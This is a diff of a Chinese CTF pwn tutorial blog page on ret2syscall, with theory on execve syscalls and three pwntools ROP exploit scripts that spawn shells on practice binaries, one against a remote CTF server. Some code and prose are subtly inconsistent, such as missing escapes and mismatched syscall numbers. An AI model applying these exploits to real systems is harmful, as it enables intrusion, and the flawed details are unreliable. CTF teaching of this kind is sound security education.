@@ -10,7 +10,7 @@
   font-family: 'JetBrains Mono';
   src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
 }
-</style><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy"}}</script><link type="text/css" rel="stylesheet" href="/lib/encrypt/hbe.style.css"><script src="//unpkg.com/mermaid@10.5.0/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
+</style><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"复制"}}</script><link type="text/css" rel="stylesheet" href="/lib/encrypt/hbe.style.css"><script src="//unpkg.com/mermaid@10.5.0/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
  document.documentElement.setAttribute('theme-mode', 'light')
 if (window.localStorage.getItem('theme-mode') === 'dark')
  document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
@@ -23,7 +23,7 @@ if (window.localStorage.getItem('theme-mode') === 'dark')
 }</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
- --theme-encrypt-confirm: 'confirm'
+ --theme-encrypt-confirm: '确认'
 }</style><script defer src="/js/arknights.js"></script><script defer src="/js/search.js"></script><script defer type="module">import mermaid from '//unpkg.com/mermaid@10.5.0/dist/mermaid.esm.mjs';
 window.mermaid = mermaid;
 code.paintMermaid();
@@ -59,8 +59,185 @@ lightGallery(document.getElementById('post-bg'), {
    }
  }
 });
-document.addEventListener("pjax:complete", reset);reset()})</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup" tabindex="0"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>ret2syscall</h1></div><hr><div id="post-content"><p>[MoeCTF 2022]syscall</p>
-<p>[WUSTCTF 2020]getshell2</p>
+document.addEventListener("pjax:complete", reset);reset()})</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup" tabindex="0"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>ret2syscall</h1></div><hr><div id="post-content"><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​ret2syscall，就是执行系统调用以达到 getshell 的目的。</p>
+<p>选择利用的情况：没有<code>system</code>后门函数并且开启了 NX 保护。</p>
+<blockquote>
+<p>系统调用，指 <strong>用户程序</strong> 向 <strong>操作系统内核</strong> 请求需要更高权限运行的服务。系统调用提供用户程序与操作系统之间的接口。大多数系统交互式操作需求在内核态执行。如设备IO操作或者进程间通信。</p>
+</blockquote>
+<p>系统调用通过中断命令调用，通过系统调用号来区分不同的系统函数。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/winter2121/article/details/119845443">系统调用表</a></p>
+</blockquote>
+<p>一般 ret2syscall 中我们都是通过调用<code>execve</code>系统调用获取 shell。</p>
+<ul>
+<li>用途：在父进程中<code>fork</code>一个子进程，在子进程中调用<code>exec</code>函数启动新的程序。</li>
+</ul>
+<p>调用<code>execve</code>就相当于调用<code>system</code>函数，因为<code>system</code>函数在 libc库 中是通过调用<code>execve</code>来实现的。</p>
+<p>它的调用过程是：</p>
+<ol>
+<li>将系统调用的编号存入<code>ax</code>寄存器；</li>
+<li>函数参数存入其它通用寄存器；</li>
+<li>触发中断。</li>
+</ol>
+<p>这是通用过程，但是 x86 和 x64 下的中断命令和寄存器是不同同的，系统调用号也是不同的。</p>
+<p>中断</p>
+<ul>
+<li>x86：<code>int 80</code></li>
+<li>x64：<code>syscall</code></li>
+</ul>
+<p>寄存器</p>
+<ul>
+<li>x86：<code>eax</code></li>
+<li>x64：<code>rax</code></li>
+</ul>
+<p>所以我们需要对症下药。</p>
+<p>Linux 下查看系统调用号：</p>
+<ul>
+<li>x86</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">cat /usr/include/asm/unistd_32.h <br></code></pre></td></tr></table></figure>
+<ul>
+<li>x64</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">cat /usr/include/asm/unistd_64.h <br></code></pre></td></tr></table></figure>
+
+<h2 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>​Linux 的 32 位系统的中断通过<code>int 0x80</code>实现。</p>
+<p>调用系统调用的过程是：</p>
+<ol>
+<li>把系统调用的编号存入<code>eax</code>。</li>
+<li>第一个参数放入<code>ebx</code></li>
+<li>第二个参数放入<code>ecx</code></li>
+<li>第三个参数放入<code>edx</code></li>
+<li>触发<code>int 0x80</code>号中断。</li>
+</ol>
+<p>调用<code>execve</code>就需要：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">execve(&quot;/bin/sh&quot;,NULL,NULL)<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><code>eax</code>存放系统调用号</li>
+<li><code>ebx</code>存放<code>/bin/sh</code>地址</li>
+<li><code>ecx</code>置0</li>
+<li><code>edx</code>置0</li>
+</ul>
+<p>​之后通过将<code>eip</code>指向<code>int 0x80</code>的地址触发中断。<br>​	<br>​所以我们要找到<code>pop eax</code>指令的地址和<code>pop ebx</code>、<code>pop ecx</code>、<code>pop edx</code>的地址。最后找到一个<code>ret</code>将<code>eip</code>指向<code>int 0x80</code>。</p>
+<p>利用 ROPgadget 搜索相应的 gadget 的地址。</p>
+<ul>
+<li>exp</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>elf = ELF(<span class="hljs-string">&quot;./test32&quot;</span>)<br>context(arch=elf.arch, os=elf.os)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p = process([elf.path])<br><br>p.sendafter(<span class="hljs-string">&quot;please input:n&quot;</span>, <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0x101</span>)<br>p.recvuntil(<span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0x101</span>)<br>canary = u64(p.recv(<span class="hljs-number">3</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;x00&#x27;</span>)) &lt;&lt; <span class="hljs-number">8</span><br>log.info(<span class="hljs-string">&quot;canary: &quot;</span> + <span class="hljs-built_in">hex</span>(canary))<br>p.sendafter(<span class="hljs-string">&quot;please input:n&quot;</span>, <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0x104</span>)<br>p.recvuntil(<span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0x104</span>)<br>stack_addr = u32(p.recv(<span class="hljs-number">4</span>).ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;x00&#x27;</span>))<br>log.info(<span class="hljs-string">&quot;stack addr: &quot;</span> + <span class="hljs-built_in">hex</span>(stack_addr))<br><br>payload = <span class="hljs-string">&#x27;exit&#x27;</span>.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">&#x27;x00&#x27;</span>)<br>payload += p32(canary)<br>payload += p32(stack_addr - <span class="hljs-number">12</span>)<br>payload += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">4</span><br>payload += <span class="hljs-string">&#x27;b&#x27;</span> * <span class="hljs-number">8</span><br>payload += p32(elf.search(asm(<span class="hljs-string">&#x27;pop edx; pop ebx; ret;&#x27;</span>), executable=<span class="hljs-literal">True</span>).<span class="hljs-built_in">next</span>())<br>payload += p32(<span class="hljs-number">0</span>)<br>payload += p32(elf.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>())<br><span class="hljs-comment">#搜索elf文件中的汇编代码</span><br>payload += p32(elf.search(asm(<span class="hljs-string">&#x27;pop ecx ; add al, 0xf6 ; ret&#x27;</span>), executable=<span class="hljs-literal">True</span>).<span class="hljs-built_in">next</span>())<br>payload += p32(<span class="hljs-number">0</span>)<br>payload += p32(elf.search(asm(<span class="hljs-string">&#x27;pop eax; ret;&#x27;</span>), executable=<span class="hljs-literal">True</span>).<span class="hljs-built_in">next</span>())<br>payload += p32(<span class="hljs-number">0xb</span>)<br>payload += p32(elf.search(asm(<span class="hljs-string">&#x27;int 0x80;&#x27;</span>), executable=<span class="hljs-literal">True</span>).<span class="hljs-built_in">next</span>())<br>p.sendafter(<span class="hljs-string">&quot;please input:n&quot;</span>, payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><blockquote>
+<p>来自于CTF-Wiki：<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop">ret2syscall</a></p>
+</blockquote>
+<p>checksec查保护，发现程序为 32位 开启了 NX 保护</p>
+<p class='item-img' data-src='/assets/Pasted%20image%2020240716163706.png'><img src="/assets/Pasted%20image%2020240716163706.png"></p>
+<p>ida打开分析</p>
+<p class='item-img' data-src='/assets/Pasted%20image%2020240716163911.png'><img src="/assets/Pasted%20image%2020240716163911.png"></p>
+<p>发现危险函数<code>gets</code>，很明显可以看出是一个栈溢出。</p>
+<p>接下来我们寻找<code>system</code>函数，但是没有发现<code>system</code>函数。</p>
+<p class='item-img' data-src='/assets/Pasted%20image%2020240716164145.png'><img src="/assets/Pasted%20image%2020240716164145.png"></p>
+<p class='item-img' data-src='/assets/Pasted%20image%2020240716164211.png'><img src="/assets/Pasted%20image%2020240716164211.png"></p>
+<p>调用<code>execve</code>获取shell。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">execve(&quot;/bin/sh&quot;,NULL,NULL)<br></code></pre></td></tr></table></figure>
+
+<p>该程序是 32 位的，所以我们需要</p>
+<ul>
+<li>系统调用号，即eax应该为0xb。</li>
+<li>第一个参数，即当前ebx应该指向&#x2F;bin&#x2F;sh的地址，其实执行sh的地址也可以。</li>
+<li>第二个参数，即ecx应该为0</li>
+<li>第三个参数，即edx应该为0</li>
+</ul>
+<p>所以我们需要通过gadget控制这些寄存器的值。</p>
+<p>搜索程序gadget</p>
+<p>控制<code>eax</code>的gadget</p>
+<p class='item-img' data-src='/assets/Pasted%20image%2020240716164714.png'><img src="/assets/Pasted%20image%2020240716164714.png"></p>
+<p>控制<code>ebx</code>的gadget</p>
+<p class='item-img' data-src='/assets/Pasted%20image%2020240716164746.png'><img src="/assets/Pasted%20image%2020240716164746.png"></p>
+<p>其中一段gadget可以控制三个传参寄存器</p>
+<p class='item-img' data-src='/assets/Pasted%20image%2020240716165055.png'><img src="/assets/Pasted%20image%2020240716165055.png"></p>
+<p>加上前面控制<code>eax</code>的gadget，我们已经控制了所有影响寄存器的gadget。</p>
+<p>接下来寻找字符串和中断地址</p>
+<p><code>/bin/sh</code>字符串地址</p>
+<p class='item-img' data-src='/assets/Pasted%20image%2020240716165226.png'><img src="/assets/Pasted%20image%2020240716165226.png"></p>
+<p>触发中断的gadget</p>
+<p class='item-img' data-src='/assets/Pasted%20image%2020240716164859.png'><img src="/assets/Pasted%20image%2020240716164859.png"></p>
+<ol>
+<li><code>pop_eax</code>覆盖为<code>eip</code>，将栈顶的<code>0xb</code>弹入<code>eax</code></li>
+<li><code>pop_edx_ecx_ebx</code>将第一个<code>0</code>弹入<code>edx</code>，然后将第二个<code>0</code>弹入<code>ecx</code>，之后将<code>/bin/sh</code>字符串的地址弹入<code>ebx</code>。</li>
+<li>最后，<code>eip</code>覆盖为<code>int 0x80</code>地址触发中断。</li>
+</ol>
+<p class='item-img' data-src='/assets/Pasted%20image%2020240716211146.png'><img src="/assets/Pasted%20image%2020240716211146.png"></p>
+<p>通过这些gadget根据程序逻辑构造exp。</p>
+<ul>
+<li>exp</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io=process(<span class="hljs-string">&quot;./rop.rop&quot;</span>)<br><br>pop_eax=<span class="hljs-number">0x080bb196</span><br>pop_edx_ecx_ebx=<span class="hljs-number">0x0806eb90</span><br>int_80=<span class="hljs-number">0x08049421</span><br>sh=<span class="hljs-number">0x080be408</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">112</span>+p32(pop_eax)+p32(<span class="hljs-number">0xb</span>)+p32(pop_edx_ecx_ebx)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p32(sh)+p32(int_80)<br><br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>​64 位与 32 位不同，需要注意以下几点</p>
+<ul>
+<li><code>execve</code>系统调用号不同<ul>
+<li>64 位系统调用号为<code>0x3b</code></li>
+</ul>
+</li>
+<li>存放系统调用号的寄存器不同<ul>
+<li>64 位系统调用号存放在<code>rax</code></li>
+</ul>
+</li>
+<li>存储参数的寄存器不同<ul>
+<li>64 位存储参数的寄存器为：<code>rdi</code>，<code>rsi</code>，<code>rdx</code>，<code>rcx</code>，<code>r10</code>，<code>r9</code></li>
+</ul>
+</li>
+<li>中断不同<ul>
+<li>32 位为<code>int 80h</code>，64位为<code>syscall</code></li>
+</ul>
+</li>
+</ul>
+<ul>
+<li>exp</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>elf = ELF(<span class="hljs-string">&quot;./test&quot;</span>)<br>context(arch=elf.arch, os=elf.os)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = process([elf.path])<br><br>p.sendafter(<span class="hljs-string">&quot;please input:n&quot;</span>, <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0x109</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0x109</span>)<br><br><span class="hljs-comment"># 提取 canary 值</span><br>canary = u64(p.recv(<span class="hljs-number">7</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) &lt;&lt; <span class="hljs-number">8</span><br>log.info(<span class="hljs-string">&quot;canary: &quot;</span> + <span class="hljs-built_in">hex</span>(canary))<br><br>payload = <span class="hljs-string">b&#x27;exit&#x27;</span>.ljust(<span class="hljs-number">0x108</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)  <span class="hljs-comment"># 填充到特定长度</span><br>payload += p64(canary)  <span class="hljs-comment"># 添加 canary</span><br>payload += <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">8</span>  <span class="hljs-comment"># 填充其他部分</span><br><br><span class="hljs-comment"># 添加执行系统调用的指令</span><br>payload += p64(<span class="hljs-number">0x000000000040f29e</span>)  <span class="hljs-comment"># pop rsi ; ret</span><br>payload += p64(<span class="hljs-number">0x00000000004c20e0</span>)  <span class="hljs-comment"># @ .data</span><br>payload += p64(<span class="hljs-number">0x000000000044a197</span>)  <span class="hljs-comment"># pop rax ; ret</span><br>payload += <span class="hljs-string">b&#x27;/bin//sh&#x27;</span>  <span class="hljs-comment"># 字符串 /bin/sh</span><br>payload += p64(<span class="hljs-number">0x000000000047d595</span>)  <span class="hljs-comment"># mov qword ptr [rsi], rax ; ret</span><br>payload += p64(<span class="hljs-number">0x000000000040f29e</span>)  <span class="hljs-comment"># pop rsi ; ret</span><br>payload += p64(<span class="hljs-number">0x00000000004c20e8</span>)  <span class="hljs-comment"># @ .data + 8</span><br>payload += p64(<span class="hljs-number">0x0000000000443db0</span>)  <span class="hljs-comment"># xor rax, rax ; ret</span><br>payload += p64(<span class="hljs-number">0x000000000047d595</span>)  <span class="hljs-comment"># mov qword ptr [rsi], rax ; ret</span><br>payload += p64(<span class="hljs-number">0x00000000004018c2</span>)  <span class="hljs-comment"># pop rdi ; ret</span><br>payload += p64(<span class="hljs-number">0x00000000004c20e0</span>)  <span class="hljs-comment"># @ .data</span><br>payload += p64(<span class="hljs-number">0x000000000040f29e</span>)  <span class="hljs-comment"># pop rsi ; ret</span><br>payload += p64(<span class="hljs-number">0x00000000004c20e8</span>)  <span class="hljs-comment"># @ .data + 8</span><br>payload += p64(<span class="hljs-number">0x00000000004017cf</span>)  <span class="hljs-comment"># pop rdx ; ret</span><br>payload += p64(<span class="hljs-number">0x00000000004c20e8</span>)  <span class="hljs-comment"># @ .data + 8</span><br>payload += p64(elf.search(asm(<span class="hljs-string">&#x27;pop rax; ret;&#x27;</span>), executable=<span class="hljs-literal">True</span>).<span class="hljs-built_in">next</span>())  <span class="hljs-comment"># pop rax ; ret</span><br>payload += p64(<span class="hljs-number">59</span>)  <span class="hljs-comment"># 系统调用号，表示 execve</span><br>payload += p64(elf.search(asm(<span class="hljs-string">&#x27;syscall;&#x27;</span>), executable=<span class="hljs-literal">True</span>).<span class="hljs-built_in">next</span>())  <span class="hljs-comment"># 执行系统调用</span><br><br>p.sendafter(<span class="hljs-string">&quot;please input:n&quot;</span>, payload)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<h3 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h3><blockquote>
 <p>[CISCN 2023 初赛]烧烤摊儿</p>
-<p>[LitCTF 2023]ezlogin</p>
-<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2024/10/24/pwn/stack/ret2shellcode/">← Next ret2shellcode</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2024/10/24/pwn/stack/ret2text/">ret2text Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">南行</a></h1><div id="description"><p></p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/nanhang-950"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" href="mailto:2122295973@qq.com"><i class="fa fa-envelope" alt="E-Mail"></i></a></div></div><div id="aside-block"></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas></body></html>
+</blockquote>
+<p>checksec查保护，发现存在栈溢出保护和地址随机化保护。</p>
+<p class='item-img' data-src='/assets/Pasted%20image%2020240716195109.png'><img src="/assets/Pasted%20image%2020240716195109.png"></p>
+<p>执行一下程序，发现是一个购买烧烤的程序</p>
+<p class='item-img' data-src='/assets/Pasted%20image%2020240716195157.png'><img src="/assets/Pasted%20image%2020240716195157.png"></p>
+<p>ida打开分析</p>
+<p>程序可以选则购买啤酒和烤串这样会减少余额，而如果余额超过一定数量则可以承包摊位。</p>
+<p>如果承包摊位后就可以选择给摊位重命名。</p>
+<p class='item-img' data-src='/assets/Pasted%20image%2020240716200333.png'><img src="/assets/Pasted%20image%2020240716200333.png"></p>
+<p>详细分析程序发现两处整数溢出漏洞，分别为购买啤酒和购买烤串。</p>
+<p>这里只介绍第一处</p>
+<p>购买啤酒的程序通过输入数字来选择购买的啤酒，并且通过数字来选择购买的数量。</p>
+<p>如果购买啤酒的数量的金额超过余额则输出钱不够了。</p>
+<p>如果余额足够，则从余额中减去金额。</p>
+<p>但是程序没有限制输入正数还是负数，如果输入负数则判断条件仍然会正确，经过计算后余额还会增加。</p>
+<p>所以我们可以通过这个漏洞来增加余额达到足以承包烧烤摊的标准。</p>
+<p class='item-img' data-src='/assets/Pasted%20image%2020240716200701.png'><img src="/assets/Pasted%20image%2020240716200701.png"></p>
+<p>当承包烧烤摊后，我们便可以给烧烤摊改名字。</p>
+<p>而给烧烤摊改名字的函数中存在栈溢出漏洞。</p>
+<p>虽然程序开启了栈溢出，但是函数中没有检查canary的值，所以就相当于没开启。</p>
+<blockquote>
+<p>正常开启栈溢出保护的程序，通过readfsqword检查canary的值</p>
+</blockquote>
+<p class='item-img' data-src='/assets/Pasted%20image%2020240716213823.png'><img src="/assets/Pasted%20image%2020240716213823.png"></p>
+<p>并且输入没有限制，之后将输入的内容复制到表示烧烤摊名称的全局变量中。</p>
+<p class='item-img' data-src='/assets/Pasted%20image%2020240716201333.png'><img src="/assets/Pasted%20image%2020240716201333.png"></p>
+<p>我们可以通过改名输入<code>/bin/sh</code>到栈中，改名称的时候会将<code>/bin/sh</code>复制到全局变量。</p>
+<p>这样我们就可以得到<code>/bin/sh</code>的地址。</p>
+<p>并且在<code>/bin/sh</code>后面接上一个<code>\x00</code>字符串结束符，用于截取<code>/bin/sh</code>。</p>
+<p>之后在其后拼接足够栈溢出的字符，通过栈溢出我们可以通过gadget实现系统调用。</p>
+<ol>
+<li>程序返回执行<code>pop_rax_rdx_rcx</code>，将<code>0xb</code>弹入<code>rax</code>，将<code>0</code>弹入<code>rdx</code>，将<code>0</code>弹入<code>rcx</code>。</li>
+<li><code>pop_rdi</code>将字符串地址弹入<code>rdi</code>。</li>
+<li><code>pop_rsi</code>将<code>0</code>弹入<code>rsi</code>。</li>
+<li>之后<code>rip</code>的值覆盖为<code>syscall</code>地址，触发中断。</li>
+<li class='item-img' data-src='/assets/Pasted%20image%2020240716211717.png'><img src="/assets/Pasted%20image%2020240716211717.png"></li>
+</ol>
+<ul>
+<li>exp</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#io=process(&quot;./shaokao&quot;)</span><br>io=remote(<span class="hljs-string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="hljs-number">28662</span>)<br><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br><br><span class="hljs-comment">#触发整数溢出漏洞</span><br>io.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>io.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>io.sendline(<span class="hljs-string">b&#x27;-10000&#x27;</span>)<br><span class="hljs-comment">#承包烧烤摊并修改名称</span><br>io.sendline(<span class="hljs-string">b&#x27;4&#x27;</span>)<br>io.sendline(<span class="hljs-string">b&#x27;5&#x27;</span>)<br><br><span class="hljs-comment">#全局变量的地址</span><br>sh=<span class="hljs-number">0x4E60F0</span><br><br>pop_rax_rdx_rbx=<span class="hljs-number">0x00000000004a404a</span> <span class="hljs-comment">#: pop rax ; pop rdx ; pop rbx ; ret</span><br>pop_rdi=<span class="hljs-number">0x000000000040264f</span> <span class="hljs-comment">#: pop rdi ; ret</span><br>pop_rsi=<span class="hljs-number">0x000000000040a67e</span> <span class="hljs-comment">#: pop rsi ; ret</span><br>syscall=<span class="hljs-number">0x0000000000402404</span> <span class="hljs-comment">#: syscall</span><br><br><span class="hljs-comment">#加上\x00这样在execve函数读取到/bin/sh之后就会截停</span><br>payload=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(pop_rax_rdx_rbx)+p64(<span class="hljs-number">0x3b</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(pop_rdi)+p64(sh)+p64(pop_rsi)+p64(<span class="hljs-number">0</span>)+p64(syscall)<br><br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
